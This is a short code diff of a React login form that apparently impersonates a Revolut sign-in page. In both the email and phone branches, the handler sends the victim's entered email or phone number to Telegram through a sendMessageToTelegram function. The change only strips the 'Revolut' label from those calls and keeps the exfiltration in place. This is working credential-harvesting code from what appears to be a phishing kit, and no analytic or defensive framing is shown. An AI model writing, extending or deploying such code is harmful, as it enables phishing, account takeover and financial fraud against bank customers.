@@ -61,11 +61,11 @@ export default function LoginForm() {
     const handleContinue = () => {
         if (form === 'Email') {
             console.log("Email entered:", email);
-            sendMessageToTelegram('Revolut email:', email)
+            sendMessageToTelegram(email)
             // Add your email validation logic here
         } else {
             console.log("Phone number entered:", selectedCountry?.code + phoneNumber);
-            sendMessageToTelegram('Revolut Number:', selectedCountry?.code + '' + phoneNumber)
+            sendMessageToTelegram(selectedCountry?.code + '' + phoneNumber)
             // Add your phone validation logic here
         }
     };
